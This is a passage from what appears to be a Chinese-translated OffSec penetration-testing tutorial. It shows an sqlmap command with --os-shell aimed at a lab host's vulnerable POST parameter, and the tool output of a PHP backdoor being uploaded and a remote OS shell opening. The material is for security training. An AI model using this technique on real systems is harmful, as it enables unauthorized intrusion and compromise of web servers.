
# 209 - 使用 Burp 拦截 POST 请求

接下来，我们使用 `-r` 参数调用 `sqlmap`，并将包含 POST 请求的文件作为参数。我们还需要向 `sqlmap` 指定哪个参数存在漏洞，在本例中为 `item`。最后，结合之前发现的可写目录包含 `--os-shell`。

```bash
kali@kali:~$ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
[*] starting @ 02:20:47 PM /2022-05-19/-
```

# OffSec

[14:20:47] [INFO] 正在从 'post' 解析 HTTP 请求
[14:20:47] [INFO] 正在恢复后端 DBMS: mysql
[14:20:47] [INFO] 正在测试与目标 URL 的连接
`sqlmap` 从存储会话中恢复了以下注入点：

参数: `item` (POST)
---

[14:20:48] [INFO] 后端 DBMS 为 MySQL

web 服务器操作系统: Linux Ubuntu

web 应用程序技术: Apache 2.4.52

后端 DBMS: MySQL >= 5.6

[14:20:48] [INFO] 准备使用 Web 后门进行命令提示符

[14:20:48] [INFO] 正在识别后端 DBMS 操作系统为 Linux

[14:20:48] [INFO] 后端 DBMS 操作系统为 Linux

web 服务器支持哪些 Web 语言？

- [1] ASP
- [2] ASPX
- [3] JSP
- [4] PHP (默认)

[14:20:49] [INFO] 正在使用 `/var/www/html/tmp/` 作为 Web 服务器根目录

[14:20:49] [INFO] 获取到 Web 服务器属性: `/var/www/html/search.php?`

[14:20:49] [INFO] 正在尝试通过 LIMIT LINES TERMINATED BY 向 `/var/www/html/tmp/` 上传文件 stage

[14:20:50] [WARNING] 无法通过方法向 `/var/www/html/tmp/` 上传文件 stage

[14:20:50] [INFO] 正在尝试通过 UNION 方法向 `/var/www/html/tmp/` 上传文件 stage

[14:20:50] [WARNING] 期望文件内部有 json 字符作为 union 查询的遗留

[14:20:50] [INFO] 远程文件 `/var/www/html/tmp/tmppeguek.php` (713 B) 大于本地文件 `/tmp/sqlmapkjidxlxbve22218/tmp3d6401s?` (7098b)

[14:20:51] [INFO] 文件 stage 已成功上传到 `/var/www/html/tmp/`

-- http://192.168.50.190/tmppeguek.php

[14:20:51] [INFO] 后门已成功上传到 `/var/www/html/tmp/`

-- http://192.168.50.190/tmppeguek.php

[14:20:51] [INFO] 正在调用 OS 壳。输入 'x' 或 'q' 并按回车
